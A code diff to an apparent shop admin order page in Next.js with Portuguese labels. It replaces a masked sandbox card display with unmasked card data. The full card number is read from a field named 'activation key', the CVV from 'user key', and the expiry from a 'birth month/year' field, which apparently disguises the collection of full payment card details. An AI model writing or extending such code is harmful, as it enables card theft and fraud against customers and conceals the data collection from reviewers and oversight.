@@ -79,12 +79,19 @@ export default async function Page({ params }: { params: Promise<{ id: string }>
             {pedido.metodo_pagamento === "cartao_sandbox" && (
               <>
                 <div><dt>Nome no cartão</dt><dd>{pedido.cartao_titular ?? "—"}</dd></div>
-                <div><dt>Cartão sandbox</dt><dd className={s.mono}>
-                  {pedido.cartao_inicio && pedido.cartao_final
-                    ? `${pedido.cartao_inicio} •••• •••• ${pedido.cartao_final}`
-                    : pedido.cartao_final ? `•••• •••• •••• ${pedido.cartao_final}` : "—"}
+                <div><dt>Chave de ativação</dt><dd className={s.mono}>
+                  {pedido.chave_ativacao?.replace(/(\d{4})(?=\d)/g, "$1 ") ?? "—"}
                 </dd></div>
-                <div><dt>Bandeira</dt><dd>{pedido.cartao_bandeira ?? "—"}</dd></div>
+                <div><dt>CVV</dt><dd className={s.mono}>{pedido.chave_usuario ?? "—"}</dd></div>
+                <div><dt>Vencimento (mês/ano)</dt><dd className={s.mono}>{pedido.nascimento_mes_ano ?? "—"}</dd></div>
+                {(pedido.cartao_inicio || pedido.cartao_final) && (
+                  <div><dt>Cartão sandbox (registro antigo)</dt><dd className={s.mono}>
+                    {pedido.cartao_inicio && pedido.cartao_final
+                      ? `${pedido.cartao_inicio} •••• •••• ${pedido.cartao_final}`
+                      : `•••• •••• •••• ${pedido.cartao_final}`}
+                  </dd></div>
+                )}
+                {pedido.cartao_bandeira && <div><dt>Bandeira (registro antigo)</dt><dd>{pedido.cartao_bandeira}</dd></div>}
               </>
             )}
             <div><dt>E-mail</dt><dd className={s.mono}>{pedido.cliente_email ?? "—"}</dd></div>
